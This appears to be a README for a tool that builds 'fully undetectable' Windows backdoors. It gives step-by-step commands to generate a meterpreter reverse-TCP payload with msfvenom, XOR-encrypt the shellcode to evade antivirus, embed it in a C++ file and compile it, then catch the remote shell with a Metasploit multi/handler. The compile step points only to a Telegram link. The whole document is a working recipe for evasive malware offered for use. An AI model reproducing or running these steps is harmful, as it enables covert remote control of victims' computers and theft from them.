# FUD Generator with Python Cipher Encryption 🔐✔
```
sudo git clone https://github.com/PushMeUp97/FUDGeneratorPythonCipher.git
sudo chmod 777 FUDGeneratorPythonCipher
cd FUDGeneratorPythonCipher
```
# Generate Backdoor with ShellCode
```
sudo msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=<YOUR_KALI_IP> LPORT=<YOUR_SERVER_PORT> -f raw -o raw_cipher.txt
```
# Encode the ShellCode with XOR Encryption
```
sudo python xor_encryptor_cipher.py raw_cipher.txt > xor_shellcode.txt
```
# Add the crypted shellcode on main.cpp
Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:
```
char b[] = /*xor_shellcode*/
```
# Compile the main.cpp file
There is no specific way to do this, all you need to do is compile the C++ code into a windows executable. Here are ways to do that.
```
https://t.me/PushtheScriptX //make sure you have installed in your window pc
```
# Configure the Multi-Handler to catch the reverse connection
```
msfconsole
```
```use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set StageEncoder x86/shikata_ga_nai
set LHOST <YOUR_KALI_IP>
set LPORT <YOUR_SERVER_PORT>
show options
exploit
